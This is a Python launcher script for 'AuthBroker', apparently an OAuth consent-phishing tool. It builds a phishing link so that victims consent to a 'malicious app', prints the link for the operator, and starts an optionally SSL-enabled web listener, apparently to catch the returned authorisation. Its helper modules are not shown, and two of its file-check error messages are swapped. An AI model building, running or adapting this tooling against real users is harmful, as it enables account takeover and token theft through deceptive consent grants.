#!/usr/bin/python3

import argparse
from libs.functions import *
from libs.weblistener import *
from config import *
 
banner()
 
parser = argparse.ArgumentParser(description='AuthBroker args parser')
 
parser.add_argument(
    '--host',
    required=True,
    help='The webserver host to listen to'
)
parser.add_argument(
    '--port',
    required=True,
    help='The webserver port to listen to'
)
parser.add_argument(
    '--private_key',
    required=False,
    help='SSL Certificate private key path'
)
parser.add_argument(
    '--certificate',
    required=False,
    help='SSL Certificate path'
)
 
 
args = parser.parse_args()

host = args.host
port = args.port
private_key = args.private_key
certificate = args.certificate
print("\n")
phishing_link = create_phishing_link(CLIENT_ID, SCOPES, CALLBACK_URL, AUTHORITY_URL)
print_info("Use the following link to consent your malicious app")
print("\n")
print(phishing_link)
print("\n")
if certificate is not None and private_key is None:
    print_error("Please provide a key path using --private_key")
    exit()

if certificate is None and private_key is not None:
    print_error("Please provide a key path using --certificate")
    exit()

if private_key is None and certificate is None:
    print_info("Starting web listener on port %s" % port)
    weblistener = WebListener(host, port)
else:
    if not check_if_valid_file(private_key):
        print_error("Certificate file not found")
        exit()
    
    if not check_if_valid_file(certificate):
        print_error("Private Key file not found")
        exit()

    print_info("Starting web listener on port %s" % port)
    weblistener = WebListener(host, port, private_key, certificate)